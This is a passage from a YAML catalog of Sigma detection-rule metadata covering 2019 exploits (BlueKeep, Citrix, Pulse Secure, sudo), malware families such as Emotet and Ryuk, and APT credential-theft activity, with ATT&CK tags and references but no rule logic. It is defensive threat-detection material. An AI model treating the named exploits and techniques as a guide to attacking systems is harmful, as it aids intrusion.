  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  - Persistence
  techniques:
  - T1053.005
  tags:
  - attack.persistence
  - attack.execution
  - attack.privilege-escalation
  - attack.t1053.005
  - car.2013-08-001
  - detection.emerging-threats
  time_window: ''
  references:
  - https://github.com/djhohnstein/polarbearrepo/blob/f26d3e008093cc5c835e92a7165170baf6713d43/bearlpe/polarbear/polarbear/exploit.cpp
  false_positives:
  - Unknown
  notes: ''
- detection_id: 8400629e-79a9-4737-b387-5db940ab2367
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2019/Exploits/CVE-2019-0708/win_security_exploit_cve_2019_0708_scanner_poc.yml
  name: Scanner PoC for CVE-2019-0708 RDP RCE Vuln
  description: Detects the use of a scanner by zerosum0x0 that discovers targets vulnerable
    to  CVE-2019-0708 RDP RCE aka BlueKeep
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1210
  tags:
  - attack.lateral-movement
  - attack.t1210
  - car.2013-07-002
  - detection.emerging-threats
  - cve.2019-0708
  time_window: ''
  references:
  - https://twitter.com/AdamTheAnalyst/status/1134394070045003776
  - https://web.archive.org/web/20190710034152/https://github.com/zerosum0x0/CVE-2019-0708
  false_positives:
  - Unlikely
  notes: ''
- detection_id: aaa5b30d-f418-420b-83a0-299cb6024885
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2019/Exploits/CVE-2019-0708/win_system_exploit_cve_2019_0708.yml
  name: Potential RDP Exploit CVE-2019-0708
  description: Detect suspicious error on protocol RDP, potential CVE-2019-0708
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: system
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1210
  tags:
  - attack.lateral-movement
  - attack.t1210
  - car.2013-07-002
  - cve.2019-0708
  - detection.emerging-threats
  time_window: ''
  references:
  - https://web.archive.org/web/20190710034152/https://github.com/zerosum0x0/CVE-2019-0708
  - https://github.com/Ekultek/BlueKeep
  false_positives:
  - Bad connections or network interruptions
  notes: ''
- detection_id: 2dbc10d7-a797-49a8-8776-49efa6442e60
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2019/Exploits/CVE-2019-11510/web_cve_2019_11510_pulsesecure_exploit.yml
  name: Pulse Secure Attack CVE-2019-11510
  description: Detects CVE-2019-11510 exploitation attempt - URI contains Guacamole
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 4
  predictive_readiness_factors:
  - baseline_or_anomaly_framing
  severity: critical
  status: test
  platform: ''
  product: ''
  category: webserver
  data_sources: []
  tactics: []
  techniques:
  - T1190
  tags:
  - attack.initial-access
  - attack.t1190
  - cve.2019-11510
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.exploit-db.com/exploits/47297
  false_positives:
  - Unknown
  notes: ''
- detection_id: 1c373b6d-76ce-4553-997d-8c1da9a6b5f5
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2019/Exploits/CVE-2019-1378/proc_creation_win_exploit_cve_2019_1378.yml
  name: Exploiting SetupComplete.cmd CVE-2019-1378
  description: Detects exploitation attempt of privilege escalation vulnerability
    via SetupComplete.cmd and PartnerSetupComplete.cmd described in CVE-2019-1378
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  - Persistence
  techniques:
  - T1059.003
  - T1068
  - T1574
  tags:
  - attack.persistence
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1068
  - attack.execution
  - attack.t1059.003
  - attack.t1574
  - cve.2019-1378
  - detection.emerging-threats
  time_window: ''
  references:
  - https://web.archive.org/web/20200530031708/https://www.embercybersecurity.com/blog/cve-2019-1378-exploiting-an-access-control-privilege-escalation-vulnerability-in-windows-10-update-assistant-wua
  false_positives:
  - Unknown
  notes: ''
- detection_id: 02e0b2ea-a597-428e-b04a-af6a1a403e5c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2019/Exploits/CVE-2019-1388/proc_creation_win_exploit_cve_2019_1388.yml
  name: Exploiting CVE-2019-1388
  description: Detects an exploitation attempt in which the UAC consent dialogue is
    used to invoke an Internet Explorer process running as LOCAL_SYSTEM
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: critical
  status: stable
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1068
  tags:
  - attack.privilege-escalation
  - attack.t1068
  - cve.2019-1388
  - detection.emerging-threats
  time_window: ''
  references:
  - https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-1388
  - https://www.zerodayinitiative.com/blog/2019/11/19/thanksgiving-treat-easy-as-pie-windows-7-secure-desktop-escalation-of-privilege
  false_positives:
  - Unknown
  notes: ''
- detection_id: 7fcc54cb-f27d-4684-84b7-436af096f858
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2019/Exploits/CVE-2019-14287/lnx_sudo_exploit_cve_2019_14287.yml
  name: Sudo Privilege Escalation CVE-2019-14287 - Builtin
  description: Detects users trying to exploit sudo vulnerability reported in CVE-2019-14287
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: critical
  status: test
  platform: linux
  product: sudo
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1068
  - T1548.003
  tags:
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1068
  - attack.t1548.003
  - cve.2019-14287
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.openwall.com/lists/oss-security/2019/10/14/1
  - https://access.redhat.com/security/cve/cve-2019-14287
  - https://twitter.com/matthieugarin/status/1183970598210412546
  false_positives:
  - Unlikely
  notes: ''
- detection_id: f74107df-b6c6-4e80-bf00-4170b658162b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2019/Exploits/CVE-2019-14287/proc_creation_lnx_exploit_cve_2019_14287.yml
  name: Sudo Privilege Escalation CVE-2019-14287
  description: Detects users trying to exploit sudo vulnerability reported in CVE-2019-14287
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: linux
  product: linux
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1068
  - T1548.003
  tags:
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1068
  - attack.t1548.003
  - cve.2019-14287
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.openwall.com/lists/oss-security/2019/10/14/1
  - https://access.redhat.com/security/cve/cve-2019-14287
  - https://twitter.com/matthieugarin/status/1183970598210412546
  false_positives:
  - Unlikely
  notes: ''
- detection_id: ac5a6409-8c89-44c2-8d64-668c29a2d756
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2019/Exploits/CVE-2019-19781/web_cve_2019_19781_citrix_exploit.yml
  name: Citrix Netscaler Attack CVE-2019-19781
  description: Detects CVE-2019-19781 exploitation attempt against Citrix Netscaler,
    Application Delivery Controller and Citrix Gateway Attack
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 4
  predictive_readiness_factors:
  - sequence_or_progression_logic
  severity: critical
  status: test
  platform: ''
  product: ''
  category: webserver
  data_sources: []
  tactics: []
  techniques:
  - T1190
  tags:
  - attack.initial-access
  - attack.t1190
  - cve.2019-19781
  - detection.emerging-threats
  time_window: ''
  references:
  - https://support.citrix.com/article/CTX267679
  - https://support.citrix.com/article/CTX267027
  - https://isc.sans.edu/diary/25686
  - https://twitter.com/mpgn_x64/status/1216787131210829826
  - https://github.com/x1sec/CVE-2019-19781/blob/25f7ab97275b2d41800bb3414dac8ca3a78af7e5/CVE-2019-19781-DFIR.md
  false_positives:
  - Unknown
  notes: ''
- detection_id: e9bc39ae-978a-4e49-91ab-5bd481fc668b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2019/Exploits/CVE-2019-3398/web_cve_2019_3398_confluence.yml
  name: Confluence Exploitation CVE-2019-3398
  description: Detects the exploitation of the Confluence vulnerability described
    in CVE-2019-3398
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: critical
  status: test
  platform: ''
  product: ''
  category: webserver
  data_sources: []
  tactics: []
  techniques:
  - T1190
  tags:
  - attack.initial-access
  - attack.t1190
  - cve.2019-3398
  - detection.emerging-threats
  time_window: ''
  references:
  - https://devcentral.f5.com/s/articles/confluence-arbitrary-file-write-via-path-traversal-cve-2019-3398-34181
  false_positives:
  - Unknown
  notes: ''
- detection_id: 2b30fa36-3a18-402f-a22d-bf4ce2189f35
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2019/Malware/BabyShark/proc_creation_win_malware_babyshark.yml
  name: Potential Baby Shark Malware Activity
  description: Detects activity that could be related to Baby Shark malware
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  - Execution
  techniques:
  - T1012
  - T1059.001
  - T1059.003
  - T1218.005
  tags:
  - attack.execution
  - attack.defense-evasion
  - attack.discovery
  - attack.t1012
  - attack.t1059.003
  - attack.t1059.001
  - attack.t1218.005
  - detection.emerging-threats
  time_window: ''
  references:
  - https://unit42.paloaltonetworks.com/new-babyshark-malware-targets-u-s-national-security-think-tanks/
  false_positives:
  - Unknown
  notes: ''
- detection_id: fb502828-2db0-438e-93e6-801c7548686d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2019/Malware/Chafer/proxy_malware_chafer_url_pattern.yml
  name: Chafer Malware URL Pattern
  description: Detects HTTP request used by Chafer malware to receive data from its
    C2.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: ''
  product: ''
  category: proxy
  data_sources: []
  tactics: []
  techniques:
  - T1071.001
  tags:
  - attack.command-and-control
  - attack.t1071.001
  - detection.emerging-threats
  time_window: ''
  references:
  - https://securelist.com/chafer-used-remexi-malware/89538/
  false_positives:
  - Unknown
  notes: ''
- detection_id: e6eb5a96-9e6f-4a18-9cdd-642cfda21c8e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2019/Malware/Dridex/proc_creation_win_malware_dridex.yml
  name: Potential Dridex Activity
  description: Detects potential Dridex acitvity via specific process patterns
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - baseline_or_anomaly_framing
  - time_window_aggregation
  severity: critical
  status: stable
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1033
  - T1055
  - T1135
  tags:
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1055
  - attack.discovery
  - attack.t1135
  - attack.t1033
  - detection.emerging-threats
  time_window: ''
  references:
  - https://app.any.run/tasks/993daa5e-112a-4ff6-8b5a-edbcec7c7ba3
  - https://redcanary.com/threat-detection-report/threats/dridex/
  false_positives:
  - Unlikely
  notes: ''
- detection_id: f1531fa4-5b84-4342-8f68-9cf3fdbd83d4
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2019/Malware/Dtrack-RAT/proc_creation_win_malware_dtrack.yml
  name: Potential Dtrack RAT Activity
  description: Detects potential Dtrack RAT activity via specific process patterns
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: critical
  status: stable
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Impact
  techniques:
  - T1490
  tags:
  - attack.impact
  - attack.t1490
  - detection.emerging-threats
  time_window: ''
  references:
  - https://securelist.com/my-name-is-dtrack/93338/
  - https://securelist.com/andariel-deploys-dtrack-and-maui-ransomware/107063/
  - https://www.cyberbit.com/endpoint-security/dtrack-apt-malware-found-in-nuclear-power-plant/
  - https://app.any.run/tasks/4bc9860d-ab51-4077-9e09-59ad346b92fd/
  - https://app.any.run/tasks/ce4deab5-3263-494f-93e3-afb2b9d79f14/
  false_positives:
  - Unlikely
  notes: ''
- detection_id: d02e8cf5-6099-48cf-9bfc-1eec2d0c7b18
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2019/Malware/Emotet/proc_creation_win_malware_emotet.yml
  name: Potential Emotet Activity
  description: Detects all Emotet like process executions that are not covered by
    the more generic rules
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: stable
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1027
  - T1059.001
  tags:
  - attack.execution
  - attack.t1059.001
  - attack.defense-evasion
  - attack.t1027
  - detection.emerging-threats
  time_window: ''
  references:
  - https://app.any.run/tasks/e13ab713-64cf-4b23-ad93-6dceaa5429ac/
  - https://app.any.run/tasks/81f3c28c-c686-425d-8a2b-a98198d244e1/
  - https://app.any.run/tasks/97f875e8-0e08-4328-815f-055e971ba754/
  - https://app.any.run/tasks/84fc9b4a-ea2b-47b1-8aa6-9014402dfb56/
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 032f5fb3-d959-41a5-9263-4173c802dc2b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2019/Malware/Formbook/proc_creation_win_malware_formbook.yml
  name: Formbook Process Creation
  description: Detects Formbook like process executions that inject code into a set
    of files in the System32 folder, which executes a special command command line
    to delete the dropper from the AppData Temp folder. We avoid false positives by
    excluding all parent process with command line parameters.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1587.001
  tags:
  - attack.resource-development
  - attack.t1587.001
  - detection.emerging-threats
  time_window: ''
  references:
  - https://inquest.net/blog/2018/06/22/a-look-at-formbook-stealer
  - https://app.any.run/tasks/388d5802-aa48-4826-b069-250420504758/
  - https://app.any.run/tasks/8e22486b-5edc-4cef-821c-373e945f296c/
  - https://app.any.run/tasks/62bb01ae-25a4-4180-b278-8e464a90b8d7/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 74db3488-fd28-480a-95aa-b7af626de068
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2019/Malware/LockerGoga/proc_creation_win_malware_lockergoga_ransomware.yml
  name: LockerGoga Ransomware Activity
  description: Detects LockerGoga ransomware activity via specific command line.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: critical
  status: stable
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Impact
  techniques:
  - T1486
  tags:
  - attack.impact
  - attack.t1486
  - detection.emerging-threats
  time_window: ''
  references:
  - https://medium.com/@malwaredancer/lockergoga-input-arguments-ipc-communication-and-others-bd4e5a7ba80a
  - https://blog.f-secure.com/analysis-of-lockergoga-ransomware/
  - https://www.carbonblack.com/blog/tau-threat-intelligence-notification-lockergoga-ransomware/
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 4fcac6eb-0287-4090-8eea-2602e4c20040
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2019/Malware/QBot/proc_creation_win_malware_qbot.yml
  name: Potential QBot Activity
  description: Detects potential QBot activity by looking for process executions used
    previously by QBot
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: critical
  status: stable
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.005
  tags:
  - attack.execution
  - attack.t1059.005
  - detection.emerging-threats
  time_window: ''
  references:
  - https://twitter.com/killamjr/status/1179034907932315648
  - https://app.any.run/tasks/2e0647b7-eb86-4f72-904b-d2d0ecac07d1/
  false_positives:
  - Unlikely
  notes: ''
- detection_id: c37510b8-2107-4b78-aa32-72f251e7a844
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2019/Malware/Ryuk/proc_creation_win_malware_ryuk.yml
  name: Potential Ryuk Ransomware Activity
  description: Detects Ryuk ransomware activity
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: stable
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1547.001
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.t1547.001
  - detection.emerging-threats
  time_window: ''
  references:
  - https://app.any.run/tasks/d860402c-3ff4-4c1f-b367-0237da714ed1/
  - https://research.checkpoint.com/ryuk-ransomware-targeted-campaign-break/
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 5325945e-f1f0-406e-97b8-65104d393fff
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2019/Malware/Snatch/proc_creation_win_malware_snatch_ransomware.yml
  name: Potential Snatch Ransomware Activity
  description: Detects specific process characteristics of Snatch ransomware word
    document droppers
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - risk_scoring_or_weighting
  severity: high
  status: stable
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1204
  tags:
  - attack.execution
  - attack.t1204
  - detection.emerging-threats
  time_window: ''
  references:
  - https://news.sophos.com/en-us/2019/12/09/snatch-ransomware-reboots-pcs-into-safe-mode-to-bypass-protection/
  false_positives:
  - Scripts that shutdown the system immediately and reboot them in safe mode are
    unlikely
  notes: ''
- detection_id: 932ac737-33ca-4afd-9869-0d48b391fcc9
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2019/Malware/Ursnif/proxy_malware_ursnif_c2_url.yml
  name: Ursnif Malware C2 URL Pattern
  description: Detects Ursnif C2 traffic.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: critical
  status: stable
  platform: ''
  product: ''
  category: proxy
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1071.001
  - T1204.002
  - T1566.001
  tags:
  - attack.initial-access
  - attack.t1566.001
  - attack.execution
  - attack.t1204.002
  - attack.command-and-control
  - attack.t1071.001
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.fortinet.com/blog/threat-research/ursnif-variant-spreading-word-document.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: a36ce77e-30db-4ea0-8795-644d7af5dfb4
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2019/Malware/Ursnif/proxy_malware_ursnif_download_url.yml
  name: Ursnif Malware Download URL Pattern
  description: Detects download of Ursnif malware done by dropper documents.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: stable
  platform: ''
  product: ''
  category: proxy
  data_sources: []
  tactics: []
  techniques:
  - T1071.001
  tags:
  - attack.command-and-control
  - attack.t1071.001
  - detection.emerging-threats
  time_window: ''
  references:
  - https://notebook.community/Cyb3rWard0g/HELK/docker/helk-jupyter/notebooks/sigma/proxy_ursnif_malware
  false_positives:
  - Unknown
  notes: ''
- detection_id: 21f17060-b282-4249-ade0-589ea3591558
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2019/Malware/Ursnif/registry_add_malware_ursnif.yml
  name: Potential Ursnif Malware Activity - Registry
  description: Detects registry keys related to Ursnif malware.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: registry_add
  data_sources: []
  tactics:
  - Execution
  - Persistence
  techniques:
  - T1112
  tags:
  - attack.persistence
  - attack.defense-evasion
  - attack.execution
  - attack.t1112
  - detection.emerging-threats
  time_window: ''
  references:
  - https://blog.yoroi.company/research/ursnif-long-live-the-steganography/
  - https://blog.trendmicro.com/trendlabs-security-intelligence/phishing-campaign-uses-hijacked-emails-to-deliver-ursnif-by-replying-to-ongoing-threads/
  false_positives:
  - Unknown
  notes: ''
- detection_id: bd70d3f8-e60e-4d25-89f0-0b5a9cff20e0
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2019/TA/APC-C-12/proc_creation_win_apt_aptc12_bluemushroom.yml
  name: Potential APT-C-12 BlueMushroom DLL Load Activity Via Regsvr32
  description: Detects potential BlueMushroom DLL loading activity via regsvr32 from
    AppData Local
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1218.010
  tags:
  - attack.defense-evasion
  - attack.t1218.010
  - detection.emerging-threats
  time_window: ''
  references:
  - https://pbs.twimg.com/media/EF3yLGoWkAEGeLa?format=jpg
  false_positives:
  - Unknown
  notes: ''
- detection_id: 03e2746e-2b31-42f1-ab7a-eb39365b2422
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2019/TA/APT31/proc_creation_win_apt_apt31_judgement_panda.yml
  name: APT31 Judgement Panda Activity
  description: Detects APT31 Judgement Panda activity as described in the Crowdstrike
    2019 Global Threat Report
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: critical
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Collection
  techniques:
  - T1003.001
  - T1560.001
  tags:
  - attack.collection
  - attack.lateral-movement
  - attack.credential-access
  - attack.g0128
  - attack.t1003.001
  - attack.t1560.001
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.documentcloud.org/documents/5743766-Global-Threat-Report-2019.html
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 5ba715b6-71b7-44fd-8245-f66893e81b3d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2019/TA/APT40/proxy_apt_apt40_dropbox_tool_ua.yml
  name: APT40 Dropbox Tool User Agent
  description: Detects suspicious user agent string of APT40 Dropbox tool
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - baseline_or_anomaly_framing
  - time_window_aggregation
  severity: high
  status: test
  platform: ''
  product: ''
  category: proxy
  data_sources: []
  tactics:
  - Exfiltration
  techniques:
  - T1071.001
  - T1567.002
  tags:
  - attack.command-and-control
  - attack.t1071.001
  - attack.exfiltration
  - attack.t1567.002
  - detection.emerging-threats
  time_window: ''
  references:
  - Internal research from Florian Roth
  false_positives:
  - Old browsers
  notes: ''
- detection_id: b83f5166-9237-4b5e-9cd4-7b5d52f4d8ee
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2019/TA/Bear-APT-Activity/proc_creation_win_apt_bear_activity_gtr19.yml
  name: Potential Russian APT Credential Theft Activity
  description: Detects Russian group activity as described in Global Threat Report
    2019 by Crowdstrike
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: critical
  status: stable
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1003.003
  - T1552.001
  tags:
  - attack.credential-access
  - attack.t1552.001
  - attack.t1003.003
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.documentcloud.org/documents/5743766-Global-Threat-Report-2019.html
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 10152a7b-b566-438f-a33c-390b607d1c8d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2019/TA/EmpireMonkey/proc_creation_win_apt_empiremonkey.yml
  name: Potential EmpireMonkey Activity
  description: Detects potential EmpireMonkey APT activity
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1218.010
  tags:
  - attack.defense-evasion
  - attack.t1218.010
  - detection.emerging-threats
  time_window: ''
  references:
  - https://securelist.com/fin7-5-the-infamous-cybercrime-rig-fin7-continues-its-activities/90703/
  - https://malpedia.caad.fkie.fraunhofer.de/actor/anthropoid_spider
  false_positives:
  - Unlikely
  notes: ''
- detection_id: d465d1d8-27a2-4cca-9621-a800f37cf72e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2019/TA/EquationGroup/proc_creation_win_apt_equationgroup_dll_u_load.yml
  name: Equation Group DLL_U Export Function Load
  description: Detects a specific export function name used by one of EquationGroup
    tools
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: critical
  status: stable
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1218.011
  tags:
  - attack.g0020
  - attack.defense-evasion
  - attack.t1218.011
  - detection.emerging-threats
  time_window: ''
  references:
  - https://github.com/00derp/EquationGroupLeak/search?utf8=%E2%9C%93&q=dll_u&type=
  - https://twitter.com/cyb3rops/status/972186477512839170
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 2d87d610-d760-45ee-a7e6-7a6f2a65de00
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2019/TA/MustangPanda/proc_creation_win_apt_mustangpanda.yml
  name: Mustang Panda Dropper
  description: Detects specific process parameters as used by Mustang Panda droppers
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1587.001
  tags:
  - attack.t1587.001
  - attack.resource-development
  - detection.emerging-threats
  time_window: ''
  references:
  - https://app.any.run/tasks/7ca5661d-a67b-43ec-98c1-dd7a8103c256/
  - https://app.any.run/tasks/b12cccf3-1c22-4e28-9d3e-c7a6062f3914/
  - https://www.anomali.com/blog/china-based-apt-mustang-panda-targets-minority-groups-public-and-private-sector-organizations
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 1cfac73c-be78-4f9a-9b08-5bde0c3953ab
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2019/TA/Operation-Wocao/proc_creation_win_apt_wocao.yml
  name: Operation Wocao Activity
  description: Detects activity mentioned in Operation Wocao report
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - baseline_or_anomaly_framing
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  - Execution
  - Persistence
  techniques:
  - T1012
  - T1027
  - T1036.004
  - T1053.005
  - T1059.001
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.discovery
  - attack.t1012
  - attack.defense-evasion
  - attack.t1036.004
  - attack.t1027
  - attack.execution
  - attack.t1053.005
  - attack.t1059.001
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.fox-it.com/en/news/whitepapers/operation-wocao-shining-a-light-on-one-of-chinas-hidden-hacking-groups/
  - https://twitter.com/SBousseaden/status/1207671369963646976
  false_positives:
  - Administrators that use checkadmin.exe tool to enumerate local administrators
  notes: ''
- detection_id: 74ad4314-482e-4c3e-b237-3f7ed3b9ca8d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2019/TA/Operation-Wocao/win_security_apt_wocao.yml
  name: Operation Wocao Activity - Security
  description: Detects activity mentioned in Operation Wocao report
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics:
  - Discovery
  - Execution
  - Persistence
  techniques:
  - T1012
  - T1027
  - T1036.004
  - T1053.005
  - T1059.001
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.discovery
  - attack.t1012
  - attack.defense-evasion
  - attack.t1036.004
  - attack.t1027
